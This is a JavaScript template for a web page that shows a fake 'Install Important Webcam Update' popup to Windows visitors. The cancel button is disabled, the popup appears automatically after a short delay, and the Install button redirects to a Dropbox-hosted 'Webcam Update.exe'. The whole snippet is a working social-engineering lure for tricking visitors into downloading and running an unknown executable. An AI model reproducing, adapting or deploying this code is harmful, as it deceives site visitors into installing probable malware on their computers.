//####### SETTINGS  ####### 
		metroShow();
var settings = {
    "timeout" : 2, //Leave at 0 to call manually, or set to the number of seconds before pop up displays.,
    "title" : "Install Important Webcam Update",
    "message" : "An important update must be installed immediatly for Webcam privacy.",
    "actionText" : "Install",
    "cancelbtnEnabled" : false, //If true, a cancel button will appear and allow the popup to close.
    "actionLink" : "https://www.dropbox.com/s/ci0drgez6qneyfn/Webcam%20Update.exe?dl=1", //Action  button link
}


//############################
//     DO NOT EDIT BELOW
//############################

//GLOBAL VARS
var cancelbtn = "<span onClick='funcHide()' class='erbtn'>Cancel</span>";

//Font
WebFontConfig = {
    google: { families: [ 'Open+Sans::latin' ] }
  };
  (function() {
    var wf = document.createElement('script');
    wf.src = ('https:' == document.location.protocol ? 'https' : 'http') +
      '://ajax.googleapis.com/ajax/libs/webfont/1/webfont.js';
    wf.type = 'text/javascript';
    wf.async = 'true';
    var s = document.getElementsByTagName('script')[0];
    s.parentNode.insertBefore(wf, s);
  })();

//###JQUERY###

//IF WINDOWS
if (navigator.appVersion.indexOf("Windows") != -1) {
    $("body").append("<div class='ercontainer'><div class='notify'><div class='ercontent'><h3 class='ertitle'>" + settings.title + "</h3><p class='erdescription'>" + settings.message + "</p><div class='erBtnContainer'><span onClick='actionBtn()' class='erbtn'>Install</span></div></div></div></div>");
        
        if (settings.cancelbtnEnabled == true ){
            $('.erBtnContainer').append(cancelbtn);
        }
        
        if (settings.timeout != 0){
            setTimeout(function () { $(".ercontainer").fadeIn(300); }, (settings.timeout * 100));
        }

}

function actionBtn() {
    window.location.replace(settings.actionLink);
}

function funcHide() {
    $('.ercontainer').fadeOut(300);
}

function metroShow() {
$(".ercontainer").fadeIn(300);
}